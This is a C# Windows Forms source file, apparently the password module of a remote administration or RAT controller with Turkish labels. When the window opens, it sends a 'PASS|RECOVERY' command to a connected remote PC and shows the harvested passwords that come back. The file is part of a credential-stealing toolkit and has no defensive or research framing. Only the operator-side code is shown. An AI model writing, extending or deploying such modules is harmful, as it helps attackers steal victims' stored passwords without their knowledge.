// Dosya: Modules/PasswordForm.cs
//using App.Service.Modules;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace App.Service
{
    public class PasswordForm : ModuleForm, IRemoteModule
    {
        TextBox _txt;

        public PasswordForm() : base("Veri Toplama")
        {
            Size = new Size(860, 620);
            _txt = new TextBox
            {
                Multiline = true,
                ReadOnly = true,
                Dock = DockStyle.Fill,
                ScrollBars = ScrollBars.Both,
                WordWrap = false,
                BackColor = Theme.Current.Title,
                ForeColor = Theme.Current.Text,
                Font = new Font("Consolas", 9.5f),
                BorderStyle = BorderStyle.None
            };
            Body.Controls.Add(_txt);
        }

        public void Initialize(ClientSession s, Action<string> send)
        {
            Title.Text = "Veri Toplama - " + s.UserPc;
            Shown += (e, a) => { if (send != null) send("PASS|RECOVERY"); };
        }

        public void UpdatePasswords(string data)
        {
            if (IsDisposed) return;
            if (InvokeRequired) { try { BeginInvoke((MethodInvoker)delegate { UpdatePasswords(data); }); } catch { } return; }
            _txt.Text = data;
        }
    }
}